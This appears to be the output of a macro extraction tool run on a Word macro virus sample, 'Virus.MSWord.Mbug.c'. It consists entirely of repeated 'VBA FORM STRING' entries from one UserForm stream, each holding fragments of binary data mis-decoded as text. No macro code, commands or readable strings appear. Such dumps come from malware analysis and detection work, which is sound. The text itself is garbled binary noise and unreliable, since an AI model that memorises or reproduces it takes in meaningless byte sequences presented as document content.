-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S����C�h�C�s
�ba
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	מ^�"��;�IP�Cu��dNQu�}�-��U�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�)WA�w#��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��jP*=x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8׍_�G���r�)��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k3�e
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�R�S����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�bd���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�֋��5��6yu�S��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D.���MĪRH�{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����X�0^
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�;Lf�E:;��>�K�\;ԐҸ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e�A��[�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T6��/�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IY�=���
����6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Te
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ġ��1�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�̬��#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7���U�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���P�����n�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�C�\�DuD�a���Y���V๺��)/9�q��0��K�~z!F!�tvKq�e�N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���k�*�㲉!DJB\�[_|u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5ഃ�3e��;�;D�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]|��"b gLq
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a÷T;���<.�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����;
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\��>Z�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$��2���<>ڻ�;����G<��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�®M&�a�w�U��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E���n�4��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}�6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c8�#��K+=�_�ƕ=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
£vDA�]d�78�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
eF���eqd�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#%�+21
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pbM(��H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���4僠��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'F�!�OB�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5/�P�a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7B�%̆w
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ut�\��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���6B$ 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
333fff�������������fff33̙��33�ff�333
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3̙f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�̙�P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��fff3�̙��3��f��333
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3��f3f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3���f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f3f3�̙3�3f�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�f������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�f3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ff��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��3ff���3��f��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�ff�33f���33�ff�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3��f�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�̙��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f3f̙̙3��f��3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�H��ŋ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1B���$B�(R� �ѤK�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�����K�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^l���'��7/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�gˠ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
iD�L�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jT�2d4�Z�jϬ7nL�
Ӧիaa�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���٨2�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%;�מbk�u
@�]�q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0 �0]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nd]|W����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F��wo��L8���j���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�a�5�j,���M�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H��ܺ�䒕g����4�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�wk$:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i����Ɲ�k��L���3a�[���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�����_-<�����w�?}<��ӈ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������_*����ﱧ_t���Rb�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
hRe�ug[O
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>8�~?U��b
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_]�%���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�(bf)�x_`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
asW�բ�)�؎��u#�9^&dZk�xPM�%��FF
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@P֠�mL6)c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c!����|�uY�1�c�B}�x
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���9C�2��Xs��e'�ue
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���w�֛ot5
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VZ5�(�J�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�_�N�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
vr~��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q�'���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[O�1�fԤ���*Oy��g�p���RyEH!�_�(V[��ZيL9f�E
-------------------------------------------------------------------------------
